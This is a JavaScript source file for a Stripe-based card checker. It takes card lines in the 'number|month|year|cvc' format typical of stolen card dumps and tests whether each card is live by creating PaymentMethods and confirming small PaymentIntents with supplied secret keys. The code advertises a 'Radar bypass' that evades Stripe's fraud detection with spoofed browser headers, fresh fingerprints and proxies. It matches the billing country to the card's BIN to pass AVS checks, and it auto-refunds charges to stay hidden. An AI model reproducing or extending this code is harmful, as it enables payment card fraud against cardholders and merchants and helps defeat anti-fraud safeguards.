import { SKBasedResult } from '../domain/SKBasedResult.js';
import { StripePaymentMethodClient } from '../infrastructure/auth/StripePaymentMethodClient.js';
import { binLookupClient } from '../infrastructure/external/BinLookupClient.js';
import { classifyDecline } from '../utils/skbasedClassifier.js';
import axios from 'axios';

/**
 * Modern SK-Based Validator (PaymentMethod → PaymentIntent flow)
 * 
 * Uses the modern Stripe API flow recommended by Stripe:
 * 1. PaymentMethod creation (tokenization)
 * 2. PaymentIntent with confirm=true (bank authorization)
 * 3. Optional refund on success
 * 
 * Radar bypass features:
 * - Uses js.stripe.com origin (payment-element flow)
 * - Includes payment_user_agent with payment-element suffix
 * - Fresh fingerprints (guid, muid, sid) per request
 * - Browser simulation headers (Sec-Fetch-*, Accept-Encoding)
 * - Client attribution metadata for legitimacy
 */
export class SKBasedModernValidator {
    constructor(options = {}) {
        this.proxyManager = options.proxyManager || null;
        this.paymentMethodClient = options.paymentMethodClient || new StripePaymentMethodClient({
            proxyManager: this.proxyManager
        });
        this.binLookup = options.binLookup || binLookupClient;
        this.debug = options.debug !== false;
        this.timeout = options.timeout || 30000;
        this.maxRetries = options.maxRetries || 3;
    }

    _log(message, data = null) {
        // Logging disabled
    }

    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    getName() {
        return 'SKBasedModernValidator';
    }

    parseCard(cardLine) {
        if (!cardLine || typeof cardLine !== 'string') return null;

        const parts = cardLine.split('|');
        if (parts.length !== 4) return null;

        let [number, expMonth, expYear, cvc] = parts.map(p => (p || '').trim());
        number = number.replace(/\s/g, '');

        if (number.length < 13) return null;

        expYear = expYear.length === 4 ? expYear.slice(-2) : expYear;
        expMonth = expMonth.padStart(2, '0');

        return { number, expMonth, expYear, cvc };
    }

    /**
     * Check if error indicates a timeout or network error
     * @private
     */
    _isTimeoutError(errorMessage) {
        if (!errorMessage) return false;
        const message = (errorMessage || '').toLowerCase();
        return message.includes('timeout') ||
            message.includes('etimedout') ||
            message.includes('econnreset') ||
            message.includes('econnrefused') ||
            message.includes('socket hang up') ||
            message.includes('network error') ||
            message.includes('stream has been aborted') ||
            message.includes('request aborted') ||
            message.includes('exceeded');
    }

    /**
     * Create PaymentIntent and confirm with the payment method
     * @private
     */
    async _createAndConfirmPaymentIntent(pmId, skKey, options = {}) {
        const {
            amount = 100,
            currency = 'usd'
        } = options;

        const params = new URLSearchParams();
        params.append('amount', String(amount));
        params.append('currency', currency);
        params.append('payment_method', pmId);
        params.append('confirm', 'true');
        params.append('payment_method_types[]', 'card');
        // Prefer automatic 3DS handling - allows frictionless when possible
        params.append('payment_method_options[card][request_three_d_secure]', 'automatic');

        try {
            const response = await axios.post('https://api.stripe.com/v1/payment_intents', params.toString(), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': `Bearer ${skKey}`
                },
                timeout: this.timeout,
                validateStatus: () => true
            });

            return response.data;
        } catch (error) {
            return {
                error: {
                    message: error.message,
                    code: 'network_error',
                    isNetworkError: true
                }
            };
        }
    }

    /**
     * Refund a charge
     * @private
     */
    async _refundCharge(chargeId, skKey) {
        try {
            const response = await axios.post('https://api.stripe.com/v1/refunds',
                new URLSearchParams({ charge: chargeId }).toString(), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': `Bearer ${skKey}`
                },
                timeout: this.timeout,
                validateStatus: () => true
            });

            return { success: !!response.data.id, refundId: response.data.id };
        } catch (error) {
            this._log(`Refund failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    /**
     * Main validation method
     * 
     * @param {object} cardInfo - Card details { number, expMonth, expYear, cvc }
     * @param {object} options - Validation options { skKey, pkKey, proxy, chargeAmount, currency }
     * @returns {Promise<SKBasedResult>} Validation result
     */
    async validate(cardInfo, options = {}) {
        const startTime = Date.now();
        const {
            skKey,
            pkKey,
            proxy = null,
            chargeAmount = 100,
            currency = 'usd',
            gateway = 'skbased-modern',
            autoRefund = true
        } = options;

        const fullCard = `${cardInfo.number}|${cardInfo.expMonth}|${cardInfo.expYear}|${cardInfo.cvc}`;
        const maskedCard = `${cardInfo.number.slice(0, 6)}******${cardInfo.number.slice(-4)}`;

        this._log(`Starting validation for ${maskedCard}`);

        // Step 0: BIN Lookup first (for AVS matching - use card's issuing country for billing)
        // Fallback to 'US' if BIN lookup fails or returns null/empty country
        let binData = {};
        let billingCountry = 'US'; // Default fallback

        try {
            binData = await this._fetchBinData(cardInfo.number);
            // Validate country code - must be 2-letter ISO code
            if (binData.country && typeof binData.country === 'string' && binData.country.length === 2) {
                billingCountry = binData.country.toUpperCase();
            } else {
                this._log(`BIN country invalid or missing, using fallback: US`);
            }
        } catch (error) {
            this._log(`BIN lookup error, using fallback: US`);
        }

        this._log(`BIN: ${binData.brand || 'Unknown'} | ${billingCountry} | ${binData.funding || 'Unknown'}`);

        const baseData = {
            card: fullCard,
            gateway,
            chargeAmount: `${(chargeAmount / 100).toFixed(2)}`
        };

        const retryDelay = 2000;

        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Step 1: Create PaymentMethod (with Radar bypass headers and matching billing country)
                this._log(`Step 1: Creating PaymentMethod... (attempt ${attempt}/${this.maxRetries})`);
                const pmResult = await this.paymentMethodClient.createPaymentMethod(
                    {
                        number: cardInfo.number,
                        expMonth: cardInfo.expMonth,
                        expYear: cardInfo.expYear,
                        cvc: cardInfo.cvc
                    },
                    pkKey,
                    { proxy, billingCountry } // Pass the BIN country for billing details
                );

                if (!pmResult.success) {
                    // Check for network error
                    if (pmResult.isNetworkError || this._isTimeoutError(pmResult.error)) {
                        this._log(`PaymentMethod network error (attempt ${attempt}), retrying...`);
                        await this._sleep(retryDelay);
                        continue;
                    }

                    // Check for needsRetry flag (from non-blocking retry mechanism)
                    if (pmResult.needsRetry && pmResult.attemptNumber < pmResult.maxRetries) {
                        this._log(`PaymentMethod needs retry (attempt ${pmResult.attemptNumber})`);
                        await this._sleep(retryDelay);
                        continue;
                    }

                    // Card error - not retryable
                    const duration = Date.now() - startTime;
                    const classification = classifyDecline(pmResult.declineCode || pmResult.code, null, null);
                    const binData = await this._fetchBinData(cardInfo.number);

                    return new SKBasedResult({
                        ...baseData,
                        ...binData,
                        status: classification.status,
                        message: pmResult.error || classification.message,
                        declineCode: pmResult.declineCode || pmResult.code,
                        duration
                    });
                }

                const pmId = pmResult.pmId;
                const cardData = pmResult.card || {};
                this._log(`PaymentMethod created: ${pmId}`);
                this._log(`Card: ${cardData.brand} | ${cardData.country} | ${cardData.funding}`);

                // Step 2: Create PaymentIntent and confirm
                this._log('Step 2: Creating PaymentIntent with confirm...');
                const piResult = await this._createAndConfirmPaymentIntent(pmId, skKey, {
                    amount: chargeAmount,
                    currency
                });

                // Handle network error
                if (piResult.error?.isNetworkError) {
                    this._log(`PaymentIntent network error (attempt ${attempt}), retrying...`);
                    await this._sleep(retryDelay);
                    continue;
                }

                // Reuse binData from earlier lookup (no need to fetch again)

                // APPROVED - Payment succeeded!
                if (piResult.status === 'succeeded') {
                    const duration = Date.now() - startTime;
                    const chargeId = piResult.latest_charge;

                    this._log(`✅ Payment succeeded: ${piResult.id}`);
                    this._log(`Charge: ${chargeId}`);

                    // Auto refund if enabled
                    if (autoRefund && chargeId) {
                        this._log('Refunding charge...');
                        const refundResult = await this._refundCharge(chargeId, skKey);
                        if (refundResult.success) {
                            this._log(`✅ Refunded: ${refundResult.refundId}`);
                        }
                    }

                    return SKBasedResult.approved({
                        ...baseData,
                        ...binData,
                        brand: cardData.brand?.toUpperCase(),
                        country: cardData.country,
                        funding: cardData.funding?.toUpperCase(),
                        message: 'Payment Complete',
                        paymentMethodId: pmId,
                        paymentIntentId: piResult.id,
                        chargeId,
                        cvcCheck: cardData.cvcCheck,
                        duration
                    });
                }

                // 3DS Required - Card is LIVE but needs authentication
                if (piResult.status === 'requires_action') {
                    const duration = Date.now() - startTime;
                    this._log('🔐 3DS Required - Card is LIVE');

                    return SKBasedResult.live({
                        ...baseData,
                        ...binData,
                        brand: cardData.brand?.toUpperCase(),
                        country: cardData.country,
                        funding: cardData.funding?.toUpperCase(),
                        message: '3DS Required',
                        vbvStatus: '3DS Required',
                        paymentMethodId: pmId,
                        paymentIntentId: piResult.id,
                        cvcCheck: cardData.cvcCheck,
                        duration
                    });
                }

                // Payment failed
                if (piResult.error || piResult.last_payment_error) {
                    const error = piResult.error || piResult.last_payment_error;
                    const duration = Date.now() - startTime;
                    const classification = classifyDecline(
                        error.decline_code || error.code,
                        null,
                        null
                    );

                    this._log(`Charge declined: ${error.decline_code || error.code} → ${classification.status}`);

                    return new SKBasedResult({
                        ...baseData,
                        ...binData,
                        brand: cardData.brand?.toUpperCase(),
                        country: cardData.country,
                        funding: cardData.funding?.toUpperCase(),
                        status: classification.status,
                        message: classification.message,
                        declineCode: error.decline_code || error.code,
                        paymentMethodId: pmId,
                        paymentIntentId: piResult.id,
                        cvcCheck: cardData.cvcCheck,
                        duration
                    });
                }

                // Unknown status
                const duration = Date.now() - startTime;
                return SKBasedResult.unknown(`Unexpected status: ${piResult.status}`, {
                    ...baseData,
                    ...binData,
                    duration
                });

            } catch (error) {
                this._log(`❌ Exception attempt ${attempt}: ${error.message}`);
                if (attempt < this.maxRetries) {
                    await this._sleep(retryDelay);
                    continue;
                }
            }
        }

        // All retries exhausted - return as ERROR (network issue), not DECLINED
        // binData already fetched at the start of validation
        return SKBasedResult.error('Network timeout', {
            ...baseData,
            ...binData,
            isNetworkError: true,
            duration: Date.now() - startTime
        });
    }

    async _fetchBinData(cardNumber) {
        try {
            const binData = await this.binLookup.lookup(cardNumber);
            if (binData && !binData.error) {
                return {
                    brand: binData.scheme?.toUpperCase() || null,
                    type: binData.type?.toUpperCase() || null,
                    category: binData.category?.toUpperCase() || null,
                    funding: binData.type || null,
                    bank: binData.bank || null,
                    country: binData.countryCode || null,
                    countryFlag: binData.countryEmoji || null
                };
            }
        } catch (error) {
            this._log(`BIN lookup failed: ${error.message}`);
        }
        return {};
    }
}

export default SKBasedModernValidator;
